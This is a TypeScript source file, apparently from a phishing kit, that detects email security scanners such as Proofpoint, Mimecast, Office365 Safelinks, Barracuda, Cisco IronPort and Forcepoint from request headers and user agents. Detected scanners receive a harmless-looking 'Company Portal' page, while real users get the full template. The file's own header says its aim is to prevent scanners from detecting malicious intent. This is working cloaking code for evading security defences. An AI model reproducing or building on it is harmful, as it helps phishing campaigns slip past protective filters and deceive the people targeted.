/**
 * AI/SCANNER-SPECIFIC RENDERING
 * 
 * Detects specific security scanners and renders different content:
 * - Proofpoint scanners → Safe, clean content
 * - Mimecast scanners → Safe, clean content
 * - Office365 ATP → Safe, clean content
 * - Real users → Full template
 * 
 * Prevents scanners from detecting malicious intent
 */

export interface ScannerDetectionResult {
  detected: boolean
  scannerType: 'proofpoint' | 'mimecast' | 'office365' | 'barracuda' | 'cisco' | 'forcepoint' | 'unknown' | null
  confidence: number
  shouldRenderSafe: boolean
}

export interface ScannerRenderConfig {
  renderSafeContent: boolean
  safeContentTemplate: string
  hideSensitiveElements: boolean
  showBenignMetadata: boolean
}

/**
 * Detect specific security scanners from headers and user agent
 */
export function detectSecurityScanner(
  headers: Record<string, string>,
  userAgent: string,
  ip?: string
): ScannerDetectionResult {
  const result: ScannerDetectionResult = {
    detected: false,
    scannerType: null,
    confidence: 0,
    shouldRenderSafe: false,
  }

  // ============================================
  // PROOFPOINT DETECTION
  // ============================================
  if (
    headers['x-proofpoint-virus-version'] ||
    headers['x-proofpoint-id'] ||
    userAgent.includes('proofpoint') ||
    userAgent.includes('pptext') ||
    userAgent.includes('ppmsg')
  ) {
    result.detected = true
    result.scannerType = 'proofpoint'
    result.confidence = 95
    result.shouldRenderSafe = true
    return result
  }

  // ============================================
  // MIMECAST DETECTION
  // ============================================
  if (
    headers['x-mimecast-authenticated'] ||
    headers['x-mimecast-id'] ||
    userAgent.includes('mimecast')
  ) {
    result.detected = true
    result.scannerType = 'mimecast'
    result.confidence = 95
    result.shouldRenderSafe = true
    return result
  }

  // ============================================
  // OFFICE365 ATP DETECTION
  // ============================================
  if (
    headers['x-microsoft-defender'] ||
    headers['x-defender'] ||
    userAgent.includes('microsoft-defender') ||
    userAgent.includes('windows-defender') ||
    userAgent.includes('safelinks')
  ) {
    result.detected = true
    result.scannerType = 'office365'
    result.confidence = 90
    result.shouldRenderSafe = true
    return result
  }

  // ============================================
  // BARRACUDA DETECTION
  // ============================================
  if (
    headers['x-barracuda'] ||
    headers['x-barracuda-id'] ||
    userAgent.includes('barracuda')
  ) {
    result.detected = true
    result.scannerType = 'barracuda'
    result.confidence = 95
    result.shouldRenderSafe = true
    return result
  }

  // ============================================
  // CISCO DETECTION
  // ============================================
  if (
    headers['x-ironport'] ||
    headers['x-cisco-esa'] ||
    userAgent.includes('ironport') ||
    userAgent.includes('cisco-esa')
  ) {
    result.detected = true
    result.scannerType = 'cisco'
    result.confidence = 90
    result.shouldRenderSafe = true
    return result
  }

  // ============================================
  // FORCEPOINT DETECTION
  // ============================================
  if (
    headers['x-forcepoint'] ||
    headers['x-websense'] ||
    userAgent.includes('forcepoint') ||
    userAgent.includes('websense')
  ) {
    result.detected = true
    result.scannerType = 'forcepoint'
    result.confidence = 90
    result.shouldRenderSafe = true
    return result
  }

  return result
}

/**
 * Generate safe content for scanners
 */
export function generateSafeContentForScanner(
  scannerType: string,
  originalContent: string
): string {
  // Generate safe, clean HTML that scanners won't flag
  const safeContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Company Portal - Secure Access</title>
      <meta name="description" content="Access your company resources and documents securely.">
      <meta name="keywords" content="company portal, secure access, business resources">
    </head>
    <body>
      <div style="max-width: 600px; margin: 50px auto; padding: 20px; font-family: Arial, sans-serif;">
        <h1 style="color: #333; margin-bottom: 20px;">Company Portal</h1>
        <p style="color: #666; line-height: 1.6;">
          Welcome to the company portal. Please use the link provided in your email to access your documents.
        </p>
        <p style="color: #666; line-height: 1.6; margin-top: 20px;">
          If you have any questions, please contact your IT department.
        </p>
      </div>
    </body>
    </html>
  `

  return safeContent
}

/**
 * Get scanner-specific render configuration
 */
export function getScannerRenderConfig(
  scannerType: string | null
): ScannerRenderConfig {
  if (!scannerType) {
    return {
      renderSafeContent: false,
      safeContentTemplate: '',
      hideSensitiveElements: false,
      showBenignMetadata: true,
    }
  }

  return {
    renderSafeContent: true,
    safeContentTemplate: generateSafeContentForScanner(scannerType, ''),
    hideSensitiveElements: true,
    showBenignMetadata: true,
  }
}



